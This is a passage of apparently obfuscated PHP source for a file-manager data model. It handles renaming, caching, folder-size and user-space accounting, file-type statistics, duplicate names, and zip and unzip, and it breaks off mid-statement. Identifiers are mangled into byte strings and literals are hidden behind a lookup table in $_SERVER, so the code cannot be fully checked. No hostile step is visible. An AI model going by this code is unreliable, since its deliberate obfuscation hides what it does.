$this->sourceCacheClear($£ê×¯¦Í[$ÁÂ×ˆò]); } } public function rename($ŒàËæƒÏ, $¾æ£–ºî) { $ğ¹™ÍÚ€ =& $_SERVER[…É¦À–]; $¼Ôí€‚† = $this->sourceInfo($ŒàËæƒÏ); if (!$¼Ôí€‚†) { return !1; } $ÓĞ˜›ü» = $this->fileNameExist($¼Ôí€‚†[$ğ¹™ÍÚ€[461]], $¾æ£–ºî); if ($ÓĞ˜›ü» && $ÓĞ˜›ü» != $ŒàËæƒÏ) { return !1; } $®šÈ™ = array($ğ¹™ÍÚ€[449] => $¾æ£–ºî, $ğ¹™ÍÚ€[608] => USER_ID); if ($¼Ôí€‚†[$ğ¹™ÍÚ€[439]] != $ğ¹™ÍÚ€[88]) { $®šÈ™[$ğ¹™ÍÚ€[441]] = substr(get_path_ext($¾æ£–ºî), 0, 10); } Model($ğ¹™ÍÚ€[590])->eventRename($ŒàËæƒÏ, $¼Ôí€‚†[$ğ¹™ÍÚ€[32]], $¾æ£–ºî); $this->sourceCacheClear($ŒàËæƒÏ); $this->setNamePinyin($ŒàËæƒÏ, $®šÈ™[$ğ¹™ÍÚ€[32]], !1); $this->updateModifyTime($¼Ôí€‚†[$ğ¹™ÍÚ€[461]]); $¶ÏĞÈ¶ = $this->where(array($ğ¹™ÍÚ€[446] => $ŒàËæƒÏ))->data($®šÈ™)->save(); $ªŒ¯ÀÑ‚ = $ğ¹™ÍÚ€[2164] . $¼Ôí€‚†[$ğ¹™ÍÚ€[461]]; if (isset(self::$cacheChildList[$ªŒ¯ÀÑ‚])) { unset(self::$cacheChildList[$ªŒ¯ÀÑ‚]); } return $¶ÏĞÈ¶; } public function setNamePinyin($ö‡ìØõ, $û¬ÏÅß¾, $Ñ˜ªë¿Ï = true) { $üà£¿ïŞ =& $_SERVER[…É¦À–]; $Ÿ•¡øÓ = Input::check($û¬ÏÅß¾, $üà£¿ïŞ[612]); $›¦·€˜ë = array($üà£¿ïŞ[473] => KodSort::makeStr($û¬ÏÅß¾)); if ($Ÿ•¡øÓ) { $›¦·€˜ë[$üà£¿ïŞ[494]] = str_replace($üà£¿ïŞ[53], $üà£¿ïŞ[12], Pinyin::get($û¬ÏÅß¾)); $›¦·€˜ë[$üà£¿ïŞ[493]] = Pinyin::get($û¬ÏÅß¾, $üà£¿ïŞ[613]); } if (!$Ñ˜ªë¿Ï && !$Ÿ•¡øÓ) { $›¦·€˜ë[$üà£¿ïŞ[494]] = null; $›¦·€˜ë[$üà£¿ïŞ[493]] = null; } $this->metaSet($ö‡ìØõ, $›¦·€˜ë); } public function getContent($À¤½ËÇ›) { $¨¡¹™ª =& $_SERVER[…É¦À–]; $Ëûî¦ëñ = $this->fileInfoGet($À¤½ËÇ›); if (!$Ëûî¦ëñ) { return !1; } if ($Ëûî¦ëñ[$¨¡¹™ª[76]] == 0) { return $¨¡¹™ª[12]; } $ÂõĞ²Ú = $¨¡¹™ª[2178] . $Ëûî¦ëñ[$¨¡¹™ª[176]]; if ($Ëûî¦ëñ[$¨¡¹™ª[76]] <= 1024 * 10) { $˜îÀØÊÁ = Cache::get($ÂõĞ²Ú); if (!$˜îÀØÊÁ) { $˜îÀØÊÁ = IO::getContent($Ëûî¦ëñ[$¨¡¹™ª[84]]); Cache::set($ÂõĞ²Ú, $˜îÀØÊÁ); } return $˜îÀØÊÁ; } if (!$Ëûî¦ëñ[$¨¡¹™ª[84]]) { return $¨¡¹™ª[12]; } return IO::getContent($Ëûî¦ëñ[$¨¡¹™ª[84]]); } public function setDesc($÷õ¿·‚«, $¥¿İÖŞä) { $¯‚¹›ë‰ =& $_SERVER[…É¦À–]; Model($¯‚¹›ë‰[590])->eventAddDesc($÷õ¿·‚«, $¥¿İÖŞä); return $this->metaSet($÷õ¿·‚«, $¯‚¹›ë‰[482], $¥¿İÖŞä); } public function setContent($ÁÒ˜ıµ×, $×íñßì = '') { $¼ ˆş‘ =& $_SERVER[…É¦À–]; $¦Ì·òñó = $this->sourceInfo($ÁÒ˜ıµ×); $°Ğ—ø = $this->fileInfoGet($ÁÒ˜ıµ×); if (!$°Ğ—ø || !$¦Ì·òñó) { return !1; } $äŠ¿·é‚ = Model($¼ ˆş‘[500])->addFileByContent($×íñßì, $¦Ì·òñó[$¼ ˆş‘[32]]); $¬˜É¾à = $this->fileHistory($¦Ì·òñó, $äŠ¿·é‚[$¼ ˆş‘[497]], $äŠ¿·é‚[$¼ ˆş‘[76]]); if (!$¬˜É¾à) { return Model($¼ ˆş‘[500])->remove($äŠ¿·é‚[$¼ ˆş‘[497]]); } $this->folderSizeReset($¦Ì·òñó[$¼ ˆş‘[461]]); return !0; } public function fileSubstr($÷Ğõ‰¾Š, $•”ÖïÄ, $ü¨òñ§ê) { $‚İËÎ  = $this->fileInfoGet($÷Ğõ‰¾Š); if (!$‚İËÎ ) { return !1; } return IO::fileSubstr($‚İËÎ [$_SERVER[…É¦À–][84]], $•”ÖïÄ, $ü¨òñ§ê); } public function fileInfoGet($Àê˜’Ğİ) { $ëÕÄ†Ùà =& $_SERVER[…É¦À–]; $³˜èµÊÑ = $this->sourceInfo($Àê˜’Ğİ); if (!$³˜èµÊÑ || $³˜èµÊÑ[$ëÕÄ†Ùà[439]]) { return !1; } $£³ëæÚê = $ëÕÄ†Ùà[503] . $³˜èµÊÑ[$ëÕÄ†Ùà[497]]; $Â·…ïÅ’ = _get(self::$cacheFileInfo, $£³ëæÚê); if ($Â·…ïÅ’) { return $Â·…ïÅ’; } $„Õâêá» = Model($ëÕÄ†Ùà[500])->fileInfo($³˜èµÊÑ[$ëÕÄ†Ùà[497]]); if ($„Õâêá») { $„Õâêá»[$ëÕÄ†Ùà[32]] = $³˜èµÊÑ[$ëÕÄ†Ùà[32]]; } self::$cacheFileInfo[$£³ëæÚê] = $„Õâêá»; return $„Õâêá»; } private function folderChildrenNumber($ÊÇ‚ª´†) { $¯«¸¦ =& $_SERVER[…É¦À–]; $ô¼ÔË° = $this->sourceInfo($ÊÇ‚ª´†); $õË¯şò = array($¯«¸¦[609] => array($¯«¸¦[569], $ô¼ÔË°[$¯«¸¦[540]] . $ÊÇ‚ª´† . $¯«¸¦[570]), $¯«¸¦[606] => $ô¼ÔË°[$¯«¸¦[525]], $¯«¸¦[459] => intval($ô¼ÔË°[$¯«¸¦[460]]), $¯«¸¦[603] => 1); $‘ê¢É¸Ì = $this->where($õË¯şò)->count(); $ÅÎ‡¯ÒŸ = $this->where($õË¯şò)->where(array($¯«¸¦[603] => 0))->count(); return array($¯«¸¦[80] => $ÅÎ‡¯ÒŸ, $¯«¸¦[81] => $‘ê¢É¸Ì); } public function pathInfo($é¯‹×, $³Ô™ÁÏÓ = false) { $áôÕ¢Ë =& $_SERVER[…É¦À–]; $³Ô™ÁÏÓ = !1; $é¯‹× = intval($é¯‹×); $¹üÜí·¶ = $áôÕ¢Ë[490] . intval($³Ô™ÁÏÓ) . $áôÕ¢Ë[415] . $é¯‹×; $Ï¿³©• = _get(self::$cachePathInfo, $¹üÜí·¶); if ($Ï¿³©•) { return $Ï¿³©•; } $Ğ¢­«¢“ = $this->sourceInfo($é¯‹×); if (!$Ğ¢­«¢“) { return !1; } $Ğ¢­«¢“ = $this->_listDataApplyItem($Ğ¢­«¢“, $³Ô™ÁÏÓ); self::$cachePathInfo[$¹üÜí·¶] = $Ğ¢­«¢“; return $Ğ¢­«¢“; } public static $cachePathInfoMore = array(); public function pathInfoMore($î°ïÓˆÓ) { $‚Àë´õå =& $_SERVER[…É¦À–]; $¥ÊÄùæ = _get(self::$cachePathInfoMore, $î°ïÓˆÓ); if ($¥ÊÄùæ) { return $¥ÊÄùæ; } $Îµ—ÛëÇ = $this->pathInfo($î°ïÓˆÓ); if (!$Îµ—ÛëÇ) { return !1; } if ($Îµ—ÛëÇ[$‚Àë´õå[439]] == $‚Àë´õå[88]) { $Îµ—ÛëÇ[$‚Àë´õå[79]] = $this->folderChildrenNumber($î°ïÓˆÓ); } self::$cachePathInfoMore[$î°ïÓˆÓ] = $Îµ—ÛëÇ; return $Îµ—ÛëÇ; } public function sourceInfo($ŒùéÃ£Ü) { $‰»éŒ¢ =& $_SERVER[…É¦À–]; if (!$ŒùéÃ£Ü) { return array(); } $ŒùéÃ£Ü = intval($ŒùéÃ£Ü); $ˆªÀŸ“  = $‰»éŒ¢[489] . $ŒùéÃ£Ü; $Òß¥Ïî„ = _get(self::$cacheSourceInfo, $ˆªÀŸ“ ); if ($Òß¥Ïî„) { return $Òß¥Ïî„; } $¢îÔ½¥Õ = $this->where(array($‰»éŒ¢[431] => $ŒùéÃ£Ü))->find(); self::$cacheSourceInfo[$ˆªÀŸ“ ] = $¢îÔ½¥Õ; return self::$cacheSourceInfo[$ˆªÀŸ“ ]; } public function sourceCacheClear($Çâ®¿ßÔ = false) { self::cacheClear($Çâ®¿ßÔ); } public static function cacheClear($·ç»Š“ = false) { $€î‰›Ê… =& $_SERVER[…É¦À–]; if ($·ç»Š“ == !1) { self::$cacheSourceInfo = null; self::$cacheSourceInfo = array(); self::$cachePathInfo = null; self::$cachePathInfo = array(); self::$cachePathInfoMore = null; self::$cachePathInfoMore = array(); return; } unset(self::$cacheSourceInfo[$€î‰›Ê…[489] . $·ç»Š“]); unset(self::$cachePathInfoMore[$·ç»Š“]); unset(self::$cachePathInfo[$€î‰›Ê…[2179] . $·ç»Š“]); unset(self::$cachePathInfo[$€î‰›Ê…[2180] . $·ç»Š“]); } public function metaSet($”“ÉªƒÁ, $Ìµ©»ô = null, $Â°á…œ£ = null) { $§ş¦Ÿıã = parent::metaSet($”“ÉªƒÁ, $Ìµ©»ô, $Â°á…œ£); if ($§ş¦Ÿıã) { $this->sourceCacheClear($”“ÉªƒÁ); } return $§ş¦Ÿıã; } public function pathInfoByPath($òø·´ÄÌ, $£¥ÇĞî) { $”™ˆ¥Ğ‹ =& $_SERVER[…É¦À–]; $Ê¿¹€š½ = !$£¥ÇĞî ? array() : explode($”™ˆ¥Ğ‹[8], trim($£¥ÇĞî, $”™ˆ¥Ğ‹[8])); $Š¹üì = $òø·´ÄÌ; foreach ($Ê¿¹€š½ as $İÈùÀÍŞ) { $Üôéà© = array($”™ˆ¥Ğ‹[461] => $Š¹üì, $”™ˆ¥Ğ‹[32] => $İÈùÀÍŞ); $ÙÎËàÃı = $this->where($Üôéà©)->select(); if (!$ÙÎËàÃı) { return !1; } $ÙÎËàÃı = array_sort_by($ÙÎËàÃı, $”™ˆ¥Ğ‹[460]); $Š¹üì = $ÙÎËàÃı[0][$”™ˆ¥Ğ‹[431]]; } return $this->pathInfo($Š¹üì, !0); } protected function updateModifyTime($İß”×—ñ) { $úÙé¢Ãï =& $_SERVER[…É¦À–]; $­¨éëö = defined($úÙé¢Ãï[2098]) ? USER_ID : 0; if (!$İß”×—ñ) { return; } if (!is_array($İß”×—ñ)) { $İß”×—ñ = array($İß”×—ñ); } foreach ($İß”×—ñ as $œê›‘ª… => $¢¤şÜæ) { $İß”×—ñ[$œê›‘ª…] = intval($¢¤şÜæ); $this->sourceCacheClear($¢¤şÜæ); } $“¡ñ¹Õô = array($úÙé¢Ãï[431] => array($úÙé¢Ãï[7], $İß”×—ñ)); $È¡•¼¨Ñ = array($úÙé¢Ãï[608] => $­¨éëö, $úÙé¢Ãï[453] => time()); $this->where($“¡ñ¹Õô)->save($È¡•¼¨Ñ); } public function folderSizeReset($äÁ’ÂÈ“, $áäßÇ™¾ = false) { $„ŒÎŞ¦ =& $_SERVER[…É¦À–]; if ($this->statusIgnoreResetSpace) { return; } $–¿®õñ = $this->sourceInfo($äÁ’ÂÈ“); $Å»§ÒñĞ = $„ŒÎŞ¦[2181] . $äÁ’ÂÈ“; CacheLock::lock($Å»§ÒñĞ, 20); if ($áäßÇ™¾ === !1) { $this->sourceCacheClear($äÁ’ÂÈ“); $–¿®õñ = $this->sourceInfo($äÁ’ÂÈ“); $µ‰£Úé = array($„ŒÎŞ¦[430] => $äÁ’ÂÈ“, $„ŒÎŞ¦[459] => 0); $ÍÆÁ°¶Ì = $this->where($µ‰£Úé)->sum($„ŒÎŞ¦[76]); $áäßÇ™¾ = intval($ÍÆÁ°¶Ì) - intval($–¿®õñ[$„ŒÎŞ¦[76]]); } if ($áäßÇ™¾ == 0) { return CacheLock::unlock($Å»§ÒñĞ); } $ŸËññÍ = $this->parentLevelArray($–¿®õñ[$„ŒÎŞ¦[540]]); if (!$ŸËññÍ) { $ŸËññÍ = array(); } $ŸËññÍ[] = $–¿®õñ[$„ŒÎŞ¦[431]]; $µ‰£Úé = array($„ŒÎŞ¦[431] => array($„ŒÎŞ¦[447], $ŸËññÍ)); if ($áäßÇ™¾ < 0) { $µ‰£Úé[$„ŒÎŞ¦[76]] = array($„ŒÎŞ¦[1060], abs($áäßÇ™¾)); } $this->where($µ‰£Úé)->setAdd($„ŒÎŞ¦[76], $áäßÇ™¾); CacheLock::unlock($Å»§ÒñĞ); $›Ã‘¥»ğ = $„ŒÎŞ¦[2182] . $–¿®õñ[$„ŒÎŞ¦[440]] . $„ŒÎŞ¦[4] . $–¿®õñ[$„ŒÎŞ¦[525]]; $à¦ÜËú÷ = array($–¿®õñ[$„ŒÎŞ¦[440]], $–¿®õñ[$„ŒÎŞ¦[525]]); TaskRun::timeLimitCall($›Ã‘¥»ğ, $„ŒÎŞ¦[2183], $à¦ÜËú÷, 1.5); } public function folderSizeResetChildren($é–şê€¨) { $×¨ø¹… =& $_SERVER[…É¦À–]; $this->sourceCacheClear($é–şê€¨); $à­¿‰¡¬ = $this->sourceInfo($é–şê€¨); $À¿¿Ää = array($×¨ø¹…[603] => 1, $×¨ø¹…[606] => $à­¿‰¡¬[$×¨ø¹…[525]], $×¨ø¹…[609] => array($×¨ø¹…[569], $à­¿‰¡¬[$×¨ø¹…[540]] . $é–şê€¨ . $×¨ø¹…[570])); $ñÁ¿Ğù« = $×¨ø¹…[2184]; $›†º¯çÎ = $this->field($ñÁ¿Ğù«)->where($À¿¿Ää)->select(); $À¿¿Ää[$×¨ø¹…[439]] = 0; $‘İƒ©ˆÊ = $this->field($ñÁ¿Ğù«)->where($À¿¿Ää)->select(); if (!$‘İƒ©ˆÊ) { return; } $›†º¯çÎ[] = $à­¿‰¡¬; $›†º¯çÎ = array_to_keyvalue($›†º¯çÎ, $×¨ø¹…[431]); foreach ($›†º¯çÎ as $•Ê¯û¨ => $Ò´ÈÍÅ²) { $›†º¯çÎ[$•Ê¯û¨][$×¨ø¹…[2185]] = $›†º¯çÎ[$•Ê¯û¨][$×¨ø¹…[76]]; $›†º¯çÎ[$•Ê¯û¨][$×¨ø¹…[76]] = 0; } foreach ($‘İƒ©ˆÊ as $Ò´ÈÍÅ²) { $¾ëú ó² = $Ò´ÈÍÅ²[$×¨ø¹…[461]] . $×¨ø¹…[12]; if (!isset($›†º¯çÎ[$¾ëú ó²])) { continue; } if ($Ò´ÈÍÅ²[$×¨ø¹…[460]] == $›†º¯çÎ[$¾ëú ó²][$×¨ø¹…[460]]) { $›†º¯çÎ[$¾ëú ó²][$×¨ø¹…[76]] += $Ò´ÈÍÅ²[$×¨ø¹…[76]]; } } foreach ($›†º¯çÎ as $Ò´ÈÍÅ²) { $É¾Ã÷†Ç = $this->parentLevelArray($Ò´ÈÍÅ²[$×¨ø¹…[540]]); foreach ($É¾Ã÷†Ç as $¾ëú ó²) { $¾ëú ó² = $¾ëú ó² . $×¨ø¹…[12]; if (!isset($›†º¯çÎ[$¾ëú ó²])) { continue; } if ($Ò´ÈÍÅ²[$×¨ø¹…[460]] == $›†º¯çÎ[$¾ëú ó²][$×¨ø¹…[460]]) { $›†º¯çÎ[$¾ëú ó²][$×¨ø¹…[76]] += $Ò´ÈÍÅ²[$×¨ø¹…[76]]; } } } $ÂÅÊĞŞ = array(); foreach ($›†º¯çÎ as $Ò´ÈÍÅ²) { if ($Ò´ÈÍÅ²[$×¨ø¹…[76]] == $Ò´ÈÍÅ²[$×¨ø¹…[2185]]) { continue; } $ÂÅÊĞŞ[] = array($×¨ø¹…[431], $Ò´ÈÍÅ²[$×¨ø¹…[431]], $×¨ø¹…[76], $Ò´ÈÍÅ²[$×¨ø¹…[76]]); } $this->saveAll($ÂÅÊĞŞ); } public function userSpaceReset($„ìŒ‚Š„ = false) { $¤Ñ’ºš’ =& $_SERVER[…É¦À–]; $óòĞéÒ¤ = $this->where(array($¤Ñ’ºš’[440] => self::TYPE_USER, $¤Ñ’ºš’[525] => $„ìŒ‚Š„, $¤Ñ’ºš’[439] => 0))->sum($¤Ñ’ºš’[76]); $óòĞéÒ¤ = !$óòĞéÒ¤ || $óòĞéÒ¤ <= 0 ? 0 : $óòĞéÒ¤; Model($¤Ñ’ºš’[533])->userEdit($„ìŒ‚Š„, array($¤Ñ’ºš’[1866] => $óòĞéÒ¤)); } public function targetSpaceUpdate($û„¡ªª§, $Ï’İ’»§) { $à¶Á“³ =& $_SERVER[…É¦À–]; if (!$Ï’İ’»§) { return; } if (!in_array($û„¡ªª§, array(self::TYPE_USER, self::TYPE_GROUP))) { return; } $‰„ÎÇ = $this->targetSpaceSize($û„¡ªª§, $Ï’İ’»§); if ($û„¡ªª§ == self::TYPE_USER) { Model($à¶Á“³[533])->userEdit($Ï’İ’»§, array($à¶Á“³[1866] => $‰„ÎÇ)); } else { if ($û„¡ªª§ == self::TYPE_GROUP) { Model($à¶Á“³[541])->groupEdit($Ï’İ’»§, array($à¶Á“³[1866] => $‰„ÎÇ)); } } } public function targetSpaceSize($­è¬Îê, $”ü‰€½Î) { $ôÎ°ôÙ— =& $_SERVER[…É¦À–]; $ÖÆ ´°Ñ = 0; $–¤úÙºø = $this->targetSourceRoot($­è¬Îê, $”ü‰€½Î, !0); foreach ($–¤úÙºø as $Äıª½Õ±) { if (!$Äıª½Õ±) { continue; } $ÖÆ ´°Ñ += floatval($Äıª½Õ±[$ôÎ°ôÙ—[76]]); $†¸‹Óã = array($ôÎ°ôÙ—[609] => array($ôÎ°ôÙ—[569], $ôÎ°ôÙ—[550] . $Äıª½Õ±[$ôÎ°ôÙ—[431]] . $ôÎ°ôÙ—[570])); $ø¯ÕìÑ = Model($ôÎ°ôÙ—[458])->field($ôÎ°ôÙ—[446])->where($†¸‹Óã)->select(); $ø¯ÕìÑ = array_to_keyvalue($ø¯ÕìÑ, $ôÎ°ôÙ—[12], $ôÎ°ôÙ—[431]); $ø¯ÕìÑ = array_unique(array_filter($ø¯ÕìÑ)); if ($ø¯ÕìÑ) { $†¸‹Óã = array($ôÎ°ôÙ—[446] => array($ôÎ°ôÙ—[447], $ø¯ÕìÑ)); $ÖÆ ´°Ñ += floatval($this->where($†¸‹Óã)->sum($ôÎ°ôÙ—[76])); } } $ÖÆ ´°Ñ = !$ÖÆ ´°Ñ || $ÖÆ ´°Ñ <= 0 ? 0 : $ÖÆ ´°Ñ; return $ÖÆ ´°Ñ; } public function allFileTypeProfile() { return $this->fileTypeProfile(!1, !1); } public function userFileTypeProfile($¶ëËá¦Š) { return $this->fileTypeProfile($¶ëËá¦Š, SourceModel::TYPE_USER); } public function groupFileTypeProfile($öèçáÌÕ) { return $this->fileTypeProfile($öèçáÌÕ, SourceModel::TYPE_GROUP); } private function fileTypeProfile($ÂœÕ¿Ôã, $Ã–ºùÕÍ) { $Š¬”¹Ë =& $_SERVER[…É¦À–]; $ï‹ ªˆ = $Š¬”¹Ë[2186] . $ÂœÕ¿Ôã . $Š¬”¹Ë[11] . $Ã–ºùÕÍ; $Ä…é•ô = Cache::get($ï‹ ªˆ); if ($Ä…é•ô) { return $Ä…é•ô; } $«ó‡ëäé = array($Š¬”¹Ë[603] => 0); if ($ÂœÕ¿Ôã != !1) { $«ó‡ëäé[$Š¬”¹Ë[525]] = $ÂœÕ¿Ôã; $«ó‡ëäé[$Š¬”¹Ë[440]] = $Ã–ºùÕÍ; } $Å›Áƒø§ = array(); $Å›Áƒø§[$Š¬”¹Ë[2187]] = array($Š¬”¹Ë[2188] => LNG($Š¬”¹Ë[2187]), $Š¬”¹Ë[2189] => $this->where($«ó‡ëäé)->count(), $Š¬”¹Ë[574] => $this->where($«ó‡ëäé)->sum($Š¬”¹Ë[76])); $ªÕÖ™Œ‹ = KodIO::fileTypeList(); foreach ($ªÕÖ™Œ‹ as $í™¢‚ú¨ => $üú‹‰ƒ®) { $«ó‡ëäé[$Š¬”¹Ë[441]] = $this->fileTypeWhere($í™¢‚ú¨); $Å›Áƒø§[$í™¢‚ú¨] = array($Š¬”¹Ë[2188] => $üú‹‰ƒ®[$Š¬”¹Ë[32]], $Š¬”¹Ë[2189] => $this->where($«ó‡ëäé)->count(), $Š¬”¹Ë[574] => $this->where($«ó‡ëäé)->sum($Š¬”¹Ë[76])); } Cache::set($ï‹ ªˆ, $Å›Áƒø§, 1200); return $Å›Áƒø§; } public function fileNameExist($ò‹æ¨ÔÄ, $Ï®µÕ«) { $ÈøäâØ =& $_SERVER[…É¦À–]; $¿‡ì±ıœ = $this->where(array($ÈøäâØ[461] => $ò‹æ¨ÔÄ, $ÈøäâØ[32] => $Ï®µÕ«, $ÈøäâØ[460] => 0))->find(); return is_array($¿‡ì±ıœ) ? $¿‡ì±ıœ[$ÈøäâØ[431]] : !1; } public function childList($ù†ö©ğÏ) { $¨²•¨¯ =& $_SERVER[…É¦À–]; $¬îÊô€Æ = $¨²•¨¯[2164] . $ù†ö©ğÏ; if (isset(self::$cacheChildList[$¬îÊô€Æ])) { return self::$cacheChildList[$¬îÊô€Æ]; } $ó¬¥¥©ö = array($¨²•¨¯[461] => intval($ù†ö©ğÏ), $¨²•¨¯[460] => 0); $éçà“š­ = $this->where($ó¬¥¥©ö)->select(); $éçà“š­ = $éçà“š­ ? $éçà“š­ : array(); self::$cacheChildList[$¬îÊô€Æ] = $éçà“š­; foreach ($éçà“š­ as $øç˜µòŸ) { $¬îÊô€Æ = $¨²•¨¯[489] . $øç˜µòŸ[$¨²•¨¯[431]]; self::$cacheSourceInfo[$¬îÊô€Æ] = $øç˜µòŸ; } return $éçà“š­; } public function fileNameAuto($Áùì¢Ã, $í„ºÓÔ, $–ßŸ²† = REPEAT_RENAME, $Ê•÷ò§õ = false) { $¿˜¡ÏóŸ =& $_SERVER[…É¦À–]; $º»ûöîÈ = get_path_ext($í„ºÓÔ); $ĞäÑöËü = $º»ûöîÈ ? basename($í„ºÓÔ, $¿˜¡ÏóŸ[10] . $º»ûöîÈ) . $¿˜¡ÏóŸ[2190] . $º»ûöîÈ : $í„ºÓÔ . $¿˜¡ÏóŸ[413]; $ÜÉ–ÔşÍ = array($¿˜¡ÏóŸ[461] => $Áùì¢Ã, $¿˜¡ÏóŸ[460] => 0, $¿˜¡ÏóŸ[32] => array($¿˜¡ÏóŸ[412], $ĞäÑöËü)); $ƒÑÅ­ô‰ = $this->field($¿˜¡ÏóŸ[32])->where($ÜÉ–ÔşÍ)->select(); $Üéáâİ¢ = array_to_keyvalue($ƒÑÅ­ô‰, $¿˜¡ÏóŸ[12], $¿˜¡ÏóŸ[32]); return $this->fileNameAutoGet($Üéáâİ¢, $í„ºÓÔ, $–ßŸ²†, $Ê•÷ò§õ); } public function fileNameAutoGet($·ğÔ«ñ, $åØ «êø, $ó†Ş¢ÇÖ, $£¾Ó†Ø’) { $ œ¾ƒœœ =& $_SERVER[…É¦À–]; if ($ó†Ş¢ÇÖ == REPEAT_REPLACE || !$·ğÔ«ñ || !in_array_not_case($åØ «êø, $·ğÔ«ñ) || $£¾Ó†Ø’ && $ó†Ş¢ÇÖ != REPEAT_RENAME_FOLDER) { return $åØ «êø; } if ($ó†Ş¢ÇÖ == REPEAT_SKIP) { return !1; } $Ø‡‰Çè€ = $ œ¾ƒœœ[10] . get_path_ext($åØ «êø); $Ø‡‰Çè€ = $Ø‡‰Çè€ == $ œ¾ƒœœ[10] || $£¾Ó†Ø’ ? $ œ¾ƒœœ[12] : $Ø‡‰Çè€; for ($ƒ”ë§ãÛ = 1; $ƒ”ë§ãÛ <= count($·ğÔ«ñ) + 1; $ƒ”ë§ãÛ++) { $³‰Ï‘Ö¤ = substr($åØ «êø, 0, strlen($åØ «êø) - strlen($Ø‡‰Çè€)); $Š Àíİ = $³‰Ï‘Ö¤ . "\50{$ƒ”ë§ãÛ}\x29{$Ø‡‰Çè€}"; if (!in_array_not_case($Š Àíİ, $·ğÔ«ñ)) { return $Š Àíİ; } } } } goto cÚ†ßµğ¤; BÜ•›â–ëÆ: class IOArchive extends IO { function __construct() { parent::__construct(); } private static function local() { static $¼Í÷í¦; if ($¼Í÷í¦) { return $¼Í÷í¦; } $ì˜ÇŠîÒ = IO::init($_SERVER[…É¦À–][8]); return $ì˜ÇŠîÒ; } private static function iconvSystem($Ôšû‘ïó) { return self::local()->iconvSystem($Ôšû‘ïó); } private static function iconvApp($‹àÖ¤£¢) { return self::local()->iconvApp($‹àÖ¤£¢); } public static function zipFolder($ æò‚÷´, $÷ş¾ä„’ = "\172\x69\x70", $¨Àû•¯¯ = '', $ÆßÚ” = REPEAT_RENAME) { $å×÷–§ =& $_SERVER[…É¦À–]; $‚Ñ•÷œÓ = IO::listPath($ æò‚÷´); if (!$‚Ñ•÷œÓ) { return !1; } $‚Ñ•÷œÓ = array_merge($‚Ñ•÷œÓ[$å×÷–§[82]], $‚Ñ•÷œÓ[$å×÷–§[83]]); return self::zip($‚Ñ•÷œÓ, $÷ş¾ä„’, $¨Àû•¯¯, $ÆßÚ”); } public static function zip($ÆöÚ¤é¶, $îŞÁµêú = "\172\151\x70", $„ªÛıƒ­ = '', $ØäÜŸ±‰ = REPEAT_RENAME) { $¼ğ™¸ =& $_SERVER[…É¦À–]; if (is_string($ÆöÚ¤é¶) && $ÆöÚ¤é¶) { $ÆöÚ¤é¶ = array(array($¼ğ™¸[84] => $ÆöÚ¤é¶)); } $ ›òŒ¼ = self::init($ÆöÚ¤é¶[0][$¼ğ™¸[84]]); $èˆ’ÖÅ = self::info($ÆöÚ¤é¶[0][$¼ğ™¸[84]]); $¹Ñğ§ú« = $¼ğ™¸[12]; $Êµò”Öš = $¼ğ™¸[12]; $©¬¿øª¨ = $¼ğ™¸[12]; if ($„ªÛıƒ­ && substr($„ªÛıƒ­, -1, 1) != $¼ğ™¸[8]) { $Êµò”Öš = get_path_father($„ªÛıƒ­); $©¬¿øª¨ = get_path_this($„ªÛıƒ­); } else { $Êµò”Öš = self::pathFather($èˆ’ÖÅ[$¼ğ™¸[84]]); $©¬¿øª¨ = $èˆ’ÖÅ[$¼ğ™¸[32]] . $¼ğ™¸[10] . $îŞÁµêú; if (count($ÆöÚ¤é¶) > 1) { $˜œ†İÍ = IO::info($Êµò”Öš); $©¬¿øª¨ = $˜œ†İÍ[$¼ğ™¸[32]] . $¼ğ™¸[10] . $îŞÁµêú; } if ($„ªÛıƒ­) { $Êµò”Öš = $„ªÛıƒ­; } } if ($ ›òŒ¼->getType() == $¼ğ™¸[106]) { $áÕ»ò¤’ = self::init($Êµò”Öš); $šˆ±—°´ = $áÕ»ò¤’->getType() == $¼ğ™¸[106] ? $Êµò”Öš : get_path_father($ ›òŒ¼->path); $šˆ±—°´ = rtrim($šˆ±—°´, $¼ğ™¸[8]) . $¼ğ™¸[8]; mk_dir($šˆ±—°´); } else { $¹Ñğ§ú« = TEMP_FILES . $¼ğ™¸[1228] . time() . rand_string(8) . $¼ğ™¸[8]; mk_dir($¹Ñğ§ú«); file_put_contents($¹Ñğ§ú« . $¼ğ™¸[1229], $¼ğ™¸[12]); $šˆ±—°´ = $¹Ñğ§ú«; } $êù˜½Ã = IO::info($šˆ±—°´); if (!$êù˜½Ã || !$êù˜½Ã[$¼ğ™¸[203]]) { show_json(LNG($¼ğ™¸[1230]), !1); } $šŠÀ•©› = self::zipFileList($ÆöÚ¤é¶, $¹Ñğ§ú«); foreach ($šŠÀ•©› as $ÀÉêÊ => $ß“¯Ã¹‡) { $šŠÀ•©›[$ÀÉêÊ] = self::iconvSystem($ß“¯Ã¹‡); } $ËŞ¤¼ğä = get_filename_auto($šˆ±—°´ . $©¬¿øª¨, $¼ğ™¸[12], $ØäÜŸ±‰); KodArchive::create(self::iconvSystem($ËŞ¤¼ğä), $šŠÀ•©›); if (!IO::exist($ËŞ¤¼ğä)) { if ($¹Ñğ§ú«) { del_dir($¹Ñğ§ú«); } show_json(LNG($¼ğ™¸[1231]), !1); } if (!$¹Ñğ§ú«) { return $ËŞ¤¼ğä; } $”¸ß±Î© = self::move($ËŞ¤¼ğä, $Êµò”Öš, $ØäÜŸ±‰); if ($¹Ñğ§ú«) { del_dir($¹Ñğ§ú«); } if (!$ËŞ¤¼ğä) { show_json(LNG($¼ğ™¸[1231]), !1); } return $”¸ß±Î©; } public static function unzip($šÈ‡ËõŒ, $ªÔïàš, $¼÷¨”º = "\55\x31", $ø„¹ÎÉ = "\x72\x65\160\154\x61\143\145") { $‹ó³şşÎ =& $_SERVER[…É¦À–]; $ĞÀƒİ›º = parent::info($šÈ‡ËõŒ); if (!$ĞÀƒİ›º) { show_json(LNG($‹ó³şşÎ[1232]), !1); } $†ÄøÎó– = IO::infoFull($ªÔïàš); if (!$†ÄøÎó–) { $ªÔïàš = IO::mkdir($ªÔïàš); } if (isset($†ÄøÎó–[$‹ó³şşÎ[431]]) && trim($†ÄøÎó–[$‹ó³şşÎ[84]], $‹ó³şşÎ[8]) != trim($ªÔïàš, $‹ó³şşÎ[8])) { $§šÌè‘  = KodIO::make($†ÄøÎó–[$‹ó³şşÎ[461]]); $’öÆØƒ“ = IO::fileNameAuto($§šÌè‘ , $†ÄøÎó–[$‹ó³şşÎ[32]], REPEAT_RENAME_FOLDER, !0); $ªÔïàš = IO::mkdir($§šÌè‘  . $’öÆØƒ“); } $¼÷¨”º = $¼÷¨”º && 